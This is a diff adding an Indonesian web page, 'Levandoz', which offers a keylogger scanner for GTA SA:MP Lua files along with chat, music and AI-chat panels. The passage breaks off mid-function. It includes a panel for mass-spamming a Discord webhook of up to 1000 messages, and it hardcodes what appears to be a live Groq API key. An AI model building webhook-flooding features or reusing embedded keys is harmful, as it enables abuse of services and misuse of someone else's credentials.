+      border-color: rgba(255, 85, 85, 0.5);
+      transform: scale(1.02);
+    }
+
+    .floating-notification-close svg {
+      width: 14px;
+      height: 14px;
+    }
+
+    .floating-notification-content {
+      color: var(--text);
+      font-size: 15px;
+      line-height: 1.7;
+      font-family: 'Inter', sans-serif;
+      font-weight: 400;
+    }
+
+    /* Responsive */
+    @media (max-width: 480px) {
+      .floating-notification {
+        padding: 20px;
+        border-radius: 16px;
+      }
+
+      .floating-notification-title {
+        font-size: 14px;
+      }
+
+      .floating-notification-content {
+        font-size: 14px;
+      }
+
+      .floating-notification-close {
+        padding: 6px 16px;
+        font-size: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+<div class="app">
+  <div class="header">
+    <div class="hamburger-menu" onclick="toggleSidebar()">
+      <div class="hamburger-line"></div>
+      <div class="hamburger-line"></div>
+      <div class="hamburger-line"></div>
+    </div>
+    <h1>Levandoz v1</h1>
+  </div>
+
+  <!-- Sidebar Overlay -->
+  <div class="sidebar-overlay" onclick="toggleSidebar()"></div>
+
+  <!-- Sidebar -->
+  <div class="sidebar">
+    <div class="sidebar-content">
+      <div class="sidebar-banner">
+        <img src="samu.jpg" alt="RezzX Banner" oncontextmenu="return false;">
+      </div>
+      <div class="sidebar-section">
+        <div class="sidebar-title">ℹ️ Web Information</div>
+        <div class="sidebar-item"><strong>Web Name:</strong> Levandoz</div>
+        <div class="sidebar-item"><strong>Version:</strong> 1.0.0</div>
+        <div class="sidebar-item"><strong>Deskripsi:</strong> Levandoz adalah aplikasi pendeteksi keylogger dan script mencurigakan pada file Lua GTA SA:MP, didukung AI sebagai analis untuk membantu mengidentifikasi potensi ancaman dengan lebih akurat, cepat, dan mudah digunakan.</div>
+      </div>
+
+      <div class="sidebar-section">
+        <div class="sidebar-title">👨‍💻 Developer</div>
+        <div class="sidebar-item"><strong>Developer:</strong> @SamuDev</div>
+        <div class="sidebar-item"><strong>Contact:</strong></div>
+        <div class="sidebar-item" style="margin-left: 10px;">
+          <span style="color:var(--primary);">WhatsApp:</span> <span class="sidebar-link" onclick="openWhatsApp()">Click Here</span>
+        </div>
+        <div class="sidebar-item" style="margin-left: 10px;">
+          <span style="color:var(--primary);">Telegram:</span> <span class="sidebar-link" onclick="openTelegram()">Click Here</span>
+        </div>
+      </div>
+
+      <div class="sidebar-section">
+        <div class="sidebar-title">🙏 Thanks</div>
+        <div class="sidebar-item"><strong>Team:</strong> No I don't have a team</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-content">
+    <!-- HOME -->
+    <div class="menu-content active" id="home-content">
+      <div class="hero">
+        <video autoplay muted playsinline webkit-playsinline loop preload="auto" poster="" controlslist="nodownload noremoteplayback" disablepictureinpicture class="hero-video" aria-hidden="true" oncontextmenu="return false;" tabindex="-1">
+          <source src="https://raw.githubusercontent.com/rafialfarendo/TDKR-V2/main/halo.mp4" type="video/mp4">
+        </video>
+        <div class="hero-content">
+          <h2>Levandoz</h2>
+          <p><strong>Made By:</strong><br>@SamuDev🩸</p>
+        </div>
+      </div>
+
+      <!-- Floating Notification -->
+      <div id="floatingNotification" class="floating-notification">
+        <div class="floating-notification-header">
+          <div class="floating-notification-title">
+            <div class="floating-notification-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path>
+                <path d="M13.73 21a2 2 0 0 1-3.46 0"></path>
+              </svg>
+            </div>
+            <span id="notificationTitle">NOTIFICATION</span>
+          </div>
+          <button class="floating-notification-close" onclick="closeFloatingNotification()">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <line x1="18" y1="6" x2="6" y2="18"></line>
+              <line x1="6" y1="6" x2="18" y2="18"></line>
+            </svg>
+            <span>Tutup</span>
+          </button>
+        </div>
+        <div class="floating-notification-content" id="notificationContent">
+          Konten notifikasi akan muncul di sini.
+        </div>
+      </div>
+
+      <div class="grid">
+        <div class="card" onclick="openSpamKeyloggerPanel()">
+          <div class="card-icon icon-primary">
+            <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor">
+              <path d="M11.5 9C10.12 9 9 10.12 9 11.5s1.12 2.5 2.5 2.5 2.5-1.12 2.5-2.5S12.88 9 11.5 9zM20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-3.21 14.21l-2.91-2.91c-.69.44-1.51.7-2.39.7C9.01 16 7 13.99 7 11.5S9.01 7 11.5 7 16 9.01 16 11.5c0 .88-.26 1.69-.7 2.39l2.91 2.9-1.42 1.42z"/>
+            </svg>
+          </div>
+          <h3>Spam Keylogger</h3>
+          <span>Discord Webhook Spam</span>
+        </div>
+        <div class="card" onclick="openSecurePanel()">
+          <div class="card-icon icon-accent">
+            <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+          </div>
+          <h3>Secure</h3>
+          <span>Account</span>
+        </div>
+        <div class="card wide" onclick="openKeyloggerDetection()">
+          <div class="wide-left">
+            <div class="card-icon icon-primary">
+              <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+            </div>
+            <div><h3>Keylogger Detection</h3><span>Detect Lua & Luac Keyloggers</span></div>
+          </div>
+          <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg>
+        </div>
+        <div class="card" onclick="window.open('https://animaku-stream.samuxdev.biz.id/', '_blank')">
+          <div class="card-icon icon-primary">
+            <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg>
+          </div>
+          <h3>Anime Play</h3>
+        </div>
+        <div class="card" onclick="openLivechatPanel()">
+          <div class="card-icon icon-accent">
+            <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H6l-2 2V4h16v12z"/></svg>
+          </div>
+          <h3>Live Chat</h3>
+        </div>
+      </div>
+      <div class="stats">
+        <div class="stat"><strong class="primary" id="onlineCount">0</strong><span>User Online</span></div>
+        <div class="stat" onclick="openChatAiPanel()" style="cursor:pointer;display:flex;flex-direction:column;align-items:center;gap:4px;"><svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor" style="width:28px;height:28px;color:var(--accent);"><path d="M12 2a2 2 0 0 1 2 2c0 .74-.4 1.39-1 1.73V7h1a7 7 0 0 1 7 7h1a1 1 0 0 1 1 1v3a1 1 0 0 1-1 1h-1v1a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-1H2a1 1 0 0 1-1-1v-3a1 1 0 0 1 1-1h1a7 7 0 0 1 7-7h1V5.73c-.6-.34-1-.99-1-1.73a2 2 0 0 1 2-2M7.5 13A2.5 2.5 0 0 0 5 15.5A2.5 2.5 0 0 0 7.5 18a2.5 2.5 0 0 0 2.5-2.5A2.5 2.5 0 0 0 7.5 13m9 0a2.5 2.5 0 0 0-2.5 2.5a2.5 2.5 0 0 0 2.5 2.5a2.5 2.5 0 0 0 2.5-2.5a2.5 2.5 0 0 0-2.5-2.5M9 5H9V7h6V5H9"/></svg><span style="font-size:11px;color:var(--muted);">AI Chatbot</span></div>
+      </div>
+
+      <div class="card wide" onclick="openMusicPanel()" style="margin-top:14px;">
+        <div class="wide-left">
+          <div class="card-icon icon-primary">
+            <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
+          </div>
+          <div><h3>Musik</h3><span>List Lagu</span></div>
+        </div>
+        <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg>
+      </div>
+
+      <div class="card wide" onclick="openTipsTrickPanel()" style="margin-top:14px;">
+        <div class="wide-left">
+          <div class="card-icon icon-accent">
+            <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M9 21c0 .5.4 1 1 1h4c.6 0 1-.5 1-1v-1H9v1zm3-19C8.1 2 5 5.1 5 9c0 2.4 1.2 4.5 3 5.7V17c0 .5.4 1 1 1h6c.6 0 1-.5 1-1v-2.3c1.8-1.3 3-3.4 3-5.7 0-3.9-3.1-7-7-7zm2.9 11.3L13 14.1V16h-2v-1.9l-1-.9c-1.1-.9-1.8-2.3-1.8-3.8 0-2.6 2.1-4.7 4.8-4.7s4.8 2.1 4.8 4.7c0 1.5-.7 2.9-1.9 3.8z"/></svg>
+          </div>
+          <div><h3>Tips & Trick</h3><span>Keylogger Blocker</span></div>
+        </div>
+        <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg>
+      </div>
+    </div>
+
+    <!-- SPAM KEYLOGGER -->
+    <div class="menu-content" id="spam-keylogger-content">
+      <button class="back-button" onclick="closeSpamKeyloggerPanel()">
+        <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        Back to Dashboard
+      </button>
+      <div class="attack-panel">
+        <div class="form-group">
+          <label for="discordWebhookUrl">Discord Webhook URL</label>
+          <input type="text" id="discordWebhookUrl" placeholder="Ex : https://discord.com/api/webhooks/...">
+        </div>
+        <div class="form-group">
+          <label for="spamAmount">Jumlah Pesan</label>
+          <input type="number" id="spamAmount" placeholder="Ex : 100" min="1" max="1000">
+        </div>
+        <div class="form-group">
+          <label for="discordMessage">Pesan</label>
+          <textarea id="discordMessage" placeholder="Tulis pesan yang ingin dikirim..." rows="3"></textarea>
+        </div>
+        <button class="attack-button" id="spamKeyloggerButton" onclick="startSpamKeylogger()">
+          <span class="button-text">Mulai Spam</span>
+          <span class="button-spinner"></span>
+        </button>
+        <div class="timer-display" id="spamStatus"></div>
+      </div>
+    </div>
+
+    <!-- KEYLOGGER DETECTION -->
+    <div class="menu-content" id="keylogger-detection-content">
+      <button class="back-button" onclick="closeKeyloggerDetection()">
+        <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        Back to Dashboard
+      </button>
+      <div style="padding: 20px 0;">
+        <div class="manage-sender-form">
+          <h3>Keylogger Detection</h3>
+          <p style="color:var(--muted);font-size:13px;margin-bottom:15px;">Upload Lua atau Luac file untuk scan keylogger, enkripsi & external URLs</p>
+          <div class="form-group">
+            <label for="luaFile">Pilih File Lua/Luac</label>
+            <input type="file" id="luaFile" accept=".lua,.luac">
+          </div>
+          <button class="secure-button" onclick="scanKeylogger()">Scan File</button>
+          <div id="scanResult" style="margin-top:15px;display:none;">
+            <div style="background:rgba(255,255,255,0.05);padding:15px;border-radius:8px;border:1px solid rgba(255,255,255,0.1);">
+              <h4 id="scanTitle" style="margin-bottom:10px;color:var(--primary);"></h4>
+              <div id="scanDetails" style="margin-bottom:10px;"></div>
+              <div id="securityScoreDisplay"></div>
+              <p id="scanConclusion" class="conclusion-text" style="margin-top:10px;"></p>
+              <p id="scanRecommendation" style="font-size:13px;margin-top:10px;color:var(--muted);"></p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- MUSIC PLAYER -->
+    <div class="menu-content" id="music-content">
+      <button class="back-button" onclick="closeMusicPanel()">
+        <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        Back to Dashboard
+      </button>
+      <div style="padding: 20px 0;">
+        <div class="manage-sender-form">
+          <h3>🎵 Musik Player</h3>
+          <div style="background:var(--card-soft);border-radius:16px;padding:20px;border:1px solid rgba(255,255,255,0.1);margin-bottom:20px;">
+            <div style="text-align:center;margin-bottom:15px;">
+              <div style="width:80px;height:80px;border-radius:50%;background:linear-gradient(135deg, rgba(102,126,234,0.3) 0%, rgba(118,75,162,0.3) 100%);margin:0 auto 12px;display:flex;align-items:center;justify-content:center;">
+                <svg viewBox="0 0 24 24" fill="currentColor" style="width:40px;height:40px;color:var(--primary);"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
+              </div>
+              <h4 id="currentSongTitle" style="color:var(--primary);font-size:16px;margin-bottom:4px;">Pilih Lagu</h4>
+              <span id="currentSongStatus" style="color:var(--muted);font-size:12px;">-</span>
+            </div>
+            <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+              <span id="currentTime" style="color:var(--muted);font-size:11px;min-width:35px;">0:00</span>
+              <input type="range" id="progressBar" value="0" min="0" max="100" style="flex:1;height:4px;cursor:pointer;">
+              <span id="durationTime" style="color:var(--muted);font-size:11px;min-width:35px;">0:00</span>
+            </div>
+            <div style="display:flex;justify-content:center;gap:16px;">
+              <button onclick="prevSong()" style="background:none;border:none;color:var(--primary);cursor:pointer;padding:8px;">
+                <svg viewBox="0 0 24 24" fill="currentColor" style="width:32px;height:32px;"><path d="M6 6h2v12H6zm3.5 6l8.5 6V6z"/></svg>
+              </button>
+              <button id="playPauseBtn" onclick="togglePlay()" style="width:60px;height:60px;border-radius:50%;background:linear-gradient(135deg, #667eea 0%, #764ba2 100%);border:none;color:white;cursor:pointer;display:flex;align-items:center;justify-content:center;">
+                <svg id="playIcon" viewBox="0 0 24 24" fill="currentColor" style="width:28px;height:28px;"><path d="M8 5v14l11-7z"/></svg>
+                <svg id="pauseIcon" viewBox="0 0 24 24" fill="currentColor" style="width:28px;height:28px;display:none;"><path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/></svg>
+              </button>
+              <button onclick="nextSong()" style="background:none;border:none;color:var(--primary);cursor:pointer;padding:8px;">
+                <svg viewBox="0 0 24 24" fill="currentColor" style="width:32px;height:32px;"><path d="M6 18l8.5-6L6 6v12zM16 6v12h2V6h-2z"/></svg>
+              </button>
+            </div>
+          </div>
+          <h4 style="color:var(--muted);font-size:12px;margin-bottom:10px;">LIST LAGU</h4>
+          <div id="songList" style="display:flex;flex-direction:column;gap:8px;max-height:300px;overflow-y:auto;padding-right:4px;">
+            <!-- Songs will be rendered here -->
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TIPS & TRICK KEYLOGGER BLOCKER -->
+    <div class="menu-content" id="tips-trick-content">
+      <button class="back-button" onclick="closeTipsTrickPanel()">
+        <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        Back to Dashboard
+      </button>
+      <div style="padding: 20px 0;">
+        <div class="manage-sender-form">
+          <h3>🛡️ Tips & Trick Keylogger Blocker</h3>
+          <p style="color:var(--muted);font-size:13px;margin-bottom:20px;">Pelajari cara melindungi diri dari keylogger dan download alat keamanan</p>
+
+          <div class="tips-grid">
+            <!-- Video Ciri-ciri Keylogger -->
+            <div class="tips-card" onclick="openVideoPanel()">
+              <div class="tips-card-header">
+                <div class="tips-card-icon">
+                  <svg viewBox="0 0 24 24" fill="currentColor" style="width:24px;height:24px;color:#667eea;"><path d="M18 3v2h-2V3H8v2H6V3H4v18h2v-2h2v2h8v-2h2v2h2V3h-2zM8 17H6v-2h2v2zm0-4H6v-2h2v2zm0-4H6V7h2v2zm10 8h-2v-2h2v2zm0-4h-2v-2h2v2zm0-4h-2V7h2v2z"/></svg>
+                </div>
+                <div>
+                  <h3>📹 Ciri-ciri Keylogger</h3>
+                  <p>Video tentang tanda-tanda keylogger</p>
+                </div>
+              </div>
+            </div>
+
+            <!-- Keylogger Blocker File -->
+            <div class="tips-card" onclick="downloadBlockKeylogger()">
+              <div class="tips-card-header">
+                <div class="tips-card-icon">
+                  <svg viewBox="0 0 24 24" fill="currentColor" style="width:24px;height:24px;color:#4ade80;"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+                </div>
+                <div>
+                  <h3>🔒 Keylogger Blocker File</h3>
+                  <p>Download alat pemblokir keylogger</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- VIDEO PANEL -->
+    <div class="menu-content" id="video-content">
+      <button class="back-button" onclick="closeVideoPanel()">
+        <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        Back to Tips & Trick
+      </button>
+      <div style="padding: 20px 0;">
+        <div class="manage-sender-form">
+          <h3>📹 Ciri-ciri Keylogger</h3>
+          <p style="color:var(--muted);font-size:13px;margin-bottom:20px;">Pelajari tanda-tanda dan cara kerja keylogger</p>
+
+          <div class="video-container">
+            <iframe
+              src="https://www.youtube.com/embed/Is6hK4C3k-8?si=TbvzciXmoNTGLmvO"
+              title="Ciri-ciri Keylogger"
+              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+              allowfullscreen>
+            </iframe>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SECURE (REGISTER ONLY) -->
+    <div class="menu-content" id="secure-content">
+      <button class="back-button" onclick="closeSecurePanel()">
+        <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        Back to Dashboard
+      </button>
+      <div style="padding: 20px 0;">
+        <div class="secure-form" id="secureRegisterForm">
+          <h3>Daftar Nama</h3>
+          <p style="color:var(--muted);font-size:12px;margin-bottom:15px;">Masukkan nama untuk identifikasi</p>
+          <div class="form-group">
+            <label for="registerName">Nama</label>
+            <input type="text" id="registerName" placeholder="Masukkan nama..." maxlength="15">
+          </div>
+          <button class="secure-button" onclick="doRegister()">Daftar</button>
+        </div>
+        <div id="secureRegistered" style="display:none;">
+          <div style="background:var(--card-soft);border-radius:16px;padding:20px;border:1px solid rgba(255,255,255,0.1);">
+            <div style="display:flex;align-items:center;gap:12px;margin-bottom:15px;">
+              <div style="width:40px;height:40px;border-radius:50%;background:rgba(255,255,255,0.1);display:flex;align-items:center;justify-content:center;">
+                <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+              </div>
+              <div>
+                <div style="font-size:18px;font-weight:700;color:var(--primary);" id="displayName">-</div>
+                <div style="font-size:12px;color:var(--muted);">Username Terdaftar</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- LIVE CHAT -->
+    <div class="menu-content" id="livechat-content">
+      <button class="back-button" onclick="closeLivechatPanel()">
+        <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        Back to Dashboard
+      </button>
+      <div class="livechat-content">
+        <div class="chat-container" id="liveChatContainer">
+          <div class="chat-bubble bubble-system">Live Chat</div>
+        </div>
+        <div class="chat-input-container">
+          <input type="text" class="chat-input" id="liveChatInput" placeholder="Ketik pesan..." onkeypress="handleLiveChatKeyPress(event)">
+          <div class="send-button" onclick="sendLiveChatMessage()">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- CHAT AI -->
+    <div class="menu-content" id="chat-ai-content">
+      <button class="back-button" onclick="closeChatAiPanel()">
+        <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        Back to Dashboard
+      </button>
+      <div style="padding: 10px 0;">
+        <div class="ai-status-badge">
+          <div class="ai-status-dot"></div>
+          <span>Powered by Groq AI</span>
+        </div>
+
+        <div class="chat-ai-container">
+          <div class="chat-ai-messages" id="chatAiMessages">
+            <div class="ai-welcome-card" id="aiWelcomeCard">
+              <h3>🤖 Welcome to AI Chat!</h3>
+              <p>Saya adalah AI assistant yang siap membantu Anda. Tanyakan apa saja!</p>
+              <div class="ai-quick-actions">
+                <div class="ai-quick-action" onclick="sendQuickMessage('Siapa kamu?')">Siapa kamu?</div>
+                <div class="ai-quick-action" onclick="sendQuickMessage('Buatkan coding')">Buatkan coding</div>
+                <div class="ai-quick-action" onclick="sendQuickMessage('Jelaskan coding')">Jelaskan coding</div>
+                <div class="ai-quick-action" onclick="sendQuickMessage('Tips coding')">Tips coding</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="chat-ai-input-container">
+            <textarea
+              class="chat-ai-input"
+              id="chatAiInput"
+              placeholder="Ketik pesan Anda..."
+              rows="1"
+              onkeydown="handleChatAiKeyDown(event)"
+              oninput="autoResizeTextarea(this)"
+            ></textarea>
+            <button class="chat-ai-send-button" id="chatAiSendButton" onclick="sendChatAiMessage()">
+              <svg viewBox="0 0 24 24" fill="currentColor">
+                <path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/>
+              </svg>
+            </button>
+          </div>
+
+          <div style="margin-top: 10px; text-align: center;">
+            <button class="clear-chat-button" onclick="clearChatAi()">
+               Clear Chat
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Toast notification -->
+<div class="toast" id="toast">Coming soon!</div>
+
+<!-- Cooldown notification -->
+<div class="cooldown-notification" id="cooldownNotification">
+  <h3>⏳ Cooldown</h3>
+  <p>Kamu sudah Scan Files barusan</p>
+  <div class="cooldown-timer" id="cooldownTimer">30</div>
+  <button class="cooldown-close-btn" onclick="hideCooldownNotification()">Tutup</button>
+</div>
+
+<!-- Edit Chat Modal -->
+<div class="edit-modal" id="editChatModal">
+  <h3>✏️ Edit Chat</h3>
+  <textarea id="editChatTextarea" placeholder="Edit pesan..."></textarea>
+  <div class="edit-modal-buttons">
+    <button class="edit-modal-btn cancel" onclick="closeEditModal()">Batal</button>
+    <button class="edit-modal-btn save" onclick="saveEditedChat()">Simpan</button>
+  </div>
+</div>
+
+<!-- Audio Player -->
+<audio id="audioPlayer"></audio>
+
+<!-- Firebase SDK -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+  import { getDatabase, ref, push, onChildAdded, update, remove, serverTimestamp, set, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyByXv08gFFtlW5cStMaOjFEkK-EybTFzA8",
+    authDomain: "chat-samudev.firebaseapp.com",
+    databaseURL: "https://chat-samudev-default-rtdb.firebaseio.com",
+    projectId: "chat-samudev",
+    storageBucket: "chat-samudev.appspot.com",
+    messagingSenderId: "753343096382",
+    appId: "1:753343096382:android:5174bd75dce635ff4d936f"
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  // Make Firebase functions available globally
+  window.firebaseDB = db;
+  window.firebasePush = (path, data) => push(ref(db, path), data);
+  window.firebaseUpdate = (path, data) => update(ref(db, path), data);
+  window.firebaseRemove = (path) => remove(ref(db, path));
+  window.firebaseOnChildAdded = (path, callback) => onChildAdded(ref(db, path), callback);
+  window.firebaseOnValue = (path, callback) => onValue(ref(db, path), callback);
+  window.firebaseRef = (path) => ref(db, path);
+  window.firebaseSet = (path, data) => set(ref(db, path), data);
+  window.firebaseServerTimestamp = serverTimestamp;
+</script>
+
+<script>
+// ============ FLOATING NOTIFICATION SYSTEM ============
+
+// Initialize notification system when page loads
+document.addEventListener('DOMContentLoaded', () => {
+  // Wait for Firebase to be available
+  setTimeout(checkNotificationOnLoad, 1000);
+});
+
+// Check notification once when page loads
+function checkNotificationOnLoad() {
+  // Check if firebaseOnValue is available
+  if (!window.firebaseOnValue) {
+    console.error('Firebase not initialized yet, retrying in 1 second...');
+    setTimeout(checkNotificationOnLoad, 1000);
+    return;
+  }
+
+  console.log('🔔 Checking for notifications on page load...');
+
+  // Check notification once on page load
+  window.firebaseOnValue('notifications/active', (snapshot) => {
+    const data = snapshot.val();
+
+    if (data && data.judul && data.teks) {
+      // Notification exists - show it
+      console.log('📢 Notification found on page load:', data);
+      showFloatingNotification(data.judul, data.teks);
+    } else {
+      // No notification
+      console.log('📢 No active notification');
+    }
+  }, { onlyOnce: true }); // onlyOnce: true = hanya baca sekali saat load
+}
+
+// Show floating notification
+function showFloatingNotification(judul, teks) {
+  const notifEl = document.getElementById('floatingNotification');
+  const titleEl = document.getElementById('notificationTitle');
+  const contentEl = document.getElementById('notificationContent');
+
+  if (!notifEl || !titleEl || !contentEl) {
+    console.error('Notification elements not found');
+    return;
+  }
+
+  // Update content
+  titleEl.textContent = judul;
+  contentEl.textContent = teks;
+
+  // Show notification
+  notifEl.classList.remove('hiding');
+  notifEl.classList.add('show');
+
+  console.log(`✅ Showing notification: ${judul}`);
+}
+
+// Hide floating notification
+function hideFloatingNotification() {
+  const notifEl = document.getElementById('floatingNotification');
+
+  if (!notifEl) {
+    console.error('Notification element not found');
+    return;
+  }
+
+  // Add hiding animation
+  notifEl.classList.add('hiding');
+
+  // Remove show class after animation
+  setTimeout(() => {
+    notifEl.classList.remove('show');
+    notifEl.classList.remove('hiding');
+  }, 300);
+
+  console.log('✅ Hiding notification');
+}
+
+// Close floating notification (button click)
+function closeFloatingNotification() {
+  hideFloatingNotification();
+}
+
+// ============ AI CONFIGURATION ============
+// Groq untuk Chat AI dan Keylogger Detection
+const GROQ_API_KEY = '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';
+const GROQ_API_URL = 'https://api.groq.com/openai/v1/chat/completions';
+
+// Cooldown configuration
+const SCAN_COOLDOWN_SECONDS = 30;
+let lastScanTime = 0;
+let cooldownInterval = null;
+
+const USERNAME_KEY = 'tdkr_username';
+const CHAT_AI_HISTORY_KEY = 'tdkr_chat_history';
+
+let username = localStorage.getItem(USERNAME_KEY) || '';
+let chatHistory = JSON.parse(localStorage.getItem(CHAT_AI_HISTORY_KEY) || '[]');
+
+// ============ SIDEBAR FUNCTIONS ============
+function toggleSidebar() {
+  const sidebar = document.querySelector('.sidebar');
+  const overlay = document.querySelector('.sidebar-overlay');
+  const hamburger = document.querySelector('.hamburger-menu');
+
+  sidebar.classList.toggle('active');
+  overlay.classList.toggle('active');
+  hamburger.classList.toggle('active');
+}
+
+function openWhatsApp() {
+  window.open('https://wa.me/6289518217767', '_blank');
+}
+
+function openTelegram() {
+  window.open('https://t.me/SamuDev', '_blank');
+}
+
+// ============ COOLDOWN SYSTEM ============
+function isInCooldown() {
+  const now = Date.now();
+  const elapsed = (now - lastScanTime) / 1000;
+  return elapsed < SCAN_COOLDOWN_SECONDS;
+}
+
+function getRemainingCooldown() {
+  const now = Date.now();
+  const elapsed = (now - lastScanTime) / 1000;
+  const remaining = SCAN_COOLDOWN_SECONDS - elapsed;
+  return Math.ceil(remaining);
+}
+
+function showCooldownNotification() {
+  const notification = document.getElementById('cooldownNotification');
+  const timer = document.getElementById('cooldownTimer');
+
+  // Clear existing interval
+  if (cooldownInterval) {
+    clearInterval(cooldownInterval);
+  }
+
+  notification.classList.add('show');
+
+  // Update timer immediately
+  timer.textContent = getRemainingCooldown();
+
+  // Start countdown
+  cooldownInterval = setInterval(() => {
+    const remaining = getRemainingCooldown();
+
+    if (remaining <= 0) {
+      hideCooldownNotification();
+    } else {
+      timer.textContent = remaining;
+    }
+  }, 1000);
+}
+
+function hideCooldownNotification() {
+  const notification = document.getElementById('cooldownNotification');
+  notification.classList.remove('show');
+
+  if (cooldownInterval) {
+    clearInterval(cooldownInterval);
+    cooldownInterval = null;
+  }
+}
+
+// ============ TOAST ============
+function showToast(msg = "Coming soon!") {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 3000);
+}
+
+// ============ REGISTER ============
+async function doRegister() {
+  const nameInput = document.getElementById('registerName');
+  const name = nameInput.value.trim();
+
+  if (!name) {
+    return showToast('Masukkan nama!');
+  }
+  if (name.length < 2) {
+    return showToast('Nama minimal 2 karakter!');
+  }
+
+  // Check if trying to register as SamuDev
+  if (name.toLowerCase() === ADMIN_USERNAME.toLowerCase()) {
+    showToast('Memverifikasi IP...');
+    const ip = await getUserIP();
+
+    if (!ip || !ALLOWED_ADMIN_IPS.includes(ip)) {
+      console.log('Attempted SamuDev registration from IP:', ip);
+      return showToast('❌ Akses ditolak! IP tidak diizinkan.');
+    }
+  }
+
+  username = name;
+  localStorage.setItem(USERNAME_KEY, username);
+  updateSecureUI();
